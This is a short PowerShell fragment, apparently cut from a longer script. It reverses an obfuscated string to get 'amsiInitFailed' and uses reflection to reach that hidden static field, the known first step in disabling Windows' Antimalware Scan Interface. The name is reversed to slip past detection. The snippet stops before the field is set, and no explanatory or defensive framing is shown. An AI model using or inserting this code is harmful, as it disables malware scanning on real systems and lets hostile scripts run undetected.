 $rev2 = 'deliaFtiniIsma'
 $arr2 = $rev2.ToCharArray()
[Array]::Reverse($arr2)
 $n2 = -join $arr2
 $f = $g.GetField($n2, [Reflection.BindingFlags] 'NonPublic, Static')
